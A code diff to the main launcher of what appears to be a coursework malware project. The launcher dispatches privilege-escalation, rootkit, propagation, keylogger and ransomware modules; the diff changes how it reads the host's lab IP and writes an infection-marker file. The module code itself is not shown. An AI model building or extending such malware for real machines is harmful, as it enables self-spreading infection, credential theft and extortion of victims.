@@ -4,6 +4,7 @@
 
 import os
 import argparse
+import netifaces
 from time import sleep
 
 from modules import privesc
@@ -19,10 +20,12 @@ from modules import ransomware
 #####################################################     PROGRAM     #####################################################
 ###########################################################################################################################
 
-
 def main(start_module):
-    # Creates a file for the propagation module to identify whether a computer is already infected or not
-    PUBLIC_IP = os.environ.get("USER")
+    # Gets the NAT IP address of the computer (10.0.2.XX)
+    try: PUBLIC_IP = netifaces.ifaddresses("enp0s3")[netifaces.AF_INET][0]["addr"]
+    except ValueError: exit()
+    # PUBLIC_IP = os.environ.get("USER")
+    print(f"Public IP: {PUBLIC_IP}")
 
     # Path: /home/$USER/GR0up7.pem
     NO_INFECTION_FILE = os.path.join(os.path.expanduser("~"), "GR0up7.pem")
@@ -31,7 +34,7 @@ def main(start_module):
     if os.path.exists(NO_INFECTION_FILE):
         start_module = "instructions"
 
-    print(f"Public IP: {PUBLIC_IP}")
+    # Creates a file for the propagation module to identify whether a computer is already infected or not
     if not (os.path.exists(NO_INFECTION_FILE)):
         with open(NO_INFECTION_FILE, "w") as file:
             pass
@@ -114,18 +117,20 @@ if __name__ == "__main__":
         help="Module to start (privesc, rootkit, propagation, instructions, keylogger...)",
     )
     args = parser.parse_args()
+    print(args)
 
     start_module = None
 
     # args.m contains module to start
     # ex: python3 main.py -m privesc
     # args.m = "privesc"
-    if args.m is not None and isinstance(args.myarg, str):
+    # if args.m is not None and isinstance(args.myarg, str):
+    if args.m is not None:
         start_module = args.m
         print(f"[+] Selected module: {start_module}")
     else:
         print("[-] Wrong module")
-        print("[-] Using default: privesc")
         start_module = "privesc"
+        print(f"[-] Using default: {start_module}")
 
     main(start_module)
